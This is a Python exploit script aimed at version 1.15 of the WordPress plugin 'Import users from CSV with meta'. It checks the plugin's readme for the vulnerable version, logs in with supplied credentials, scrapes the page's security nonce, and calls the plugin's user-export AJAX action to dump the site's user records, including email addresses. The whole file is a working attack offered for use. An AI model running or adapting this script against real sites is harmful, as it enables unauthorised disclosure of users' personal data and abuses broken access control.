import os
import argparse
import requests
import csv
import re
from bs4 import BeautifulSoup
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()



def version_check(wordpress_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}
    plugin_url = ""+wordpress_url+"/wp-content/plugins/import-users-from-csv-with-meta/readme.txt"
    response = requests.get(plugin_url, headers=headers,verify=False,timeout=30)
    if response.status_code == 200:
        content = response.text

        version_line = next((line for line in content.split('\n') if line.startswith('Stable tag:')), None)
        if version_line:
            version = version_line.split(':')[1].strip()
            if version != '1.15':
                print("The Plugin version is "+version+" sadly it's not vulnerable.")
                exit()
            else:
                print("The plugin version is 1.15 so is vulnerable.")
                return True
        else:
            print("Failed to find the version information in the readme.txt file.")
            exit()
    else:
        print("Plugin not installed")
        exit()


def sendem(wordpress_url,wordpress_path,username,password):
    # Set up the session
    session = requests.Session()
    user_agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"

    # Define the login URL and credentials
    login_url = wordpress_url + '/wp-login.php'

    # Send a GET request to retrieve the login page and obtain necessary cookies
    response = session.get(login_url, headers={"User-Agent": user_agent})

    # Extract the required cookies from the response headers
    cookies = response.cookies

    # Prepare the login data
    login_data = {
        'log': username,
        'pwd': password,
        'wp-submit': 'Log In',
        'redirect_to': wordpress_url + '/wp-admin/',
        'testcookie': '1'
    }

    # Send a POST request to log in
    login_response = session.post(login_url, data=login_data, cookies=cookies, headers={"User-Agent": user_agent})
    if any('wordpress_logged_in' in cookie.name for cookie in session.cookies):
       csv_page = f"{wordpress_url}{wordpress_path}"
       response2 = session.get(csv_page, headers={"User-Agent": user_agent})
       soup = BeautifulSoup(response2.text, 'html.parser')
       security_input = soup.find('input', {'id': 'security'})
       if security_input:
          security_value = security_input['value']
          print(f"Security value: {security_value}")
       else:
           print("Security input not found.")
    headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/114.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Referer': ''+wordpress_url+'/wp-admin/tools.php?page=acui&tab=export',
    'Content-Type': 'multipart/form-data; boundary=---------------------------320156517837099478822912694733',
    'Origin': ''+wordpress_url+'',
    'Connection': 'close',
    'Upgrade-Insecure-Requests': '1',
     }

    data = '-----------------------------320156517837099478822912694733\r\nContent-Disposition: form-data; name="action"\r\n\r\nacui_export_users_csv\r\n-----------------------------320156517837099478822912694733\r\nContent-Disposition: form-data; name="security"\r\n\r\n'+security_value+'\r\n-----------------------------320156517837099478822912694733\r\n-----------------------------320156517837099478822912694733--\r\n'

    response = session.post(''+wordpress_url+'/wp-admin/admin-ajax.php', headers=headers, data=data, verify=False)
    if "user_email" in response.text:
        print(response.text)
    else:
        print("Your user does not have the permissions to do this action")
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-w", "--url", required=True, help="URL of the WordPress site")
    parser.add_argument("-pa", "--path", required=True, help="Path of import CSV page")
    parser.add_argument("-u", "--username", required=True, help="Username of your wordpress user")
    parser.add_argument("-p", "--password", required=True, help="Password of your wordpress password")
    args = parser.parse_args()
    wordpress_url = args.url
    version_check(wordpress_url)
    username = args.username
    password = args.password
    wordpress_path = args.path
    sendem(wordpress_url,wordpress_path,username,password)
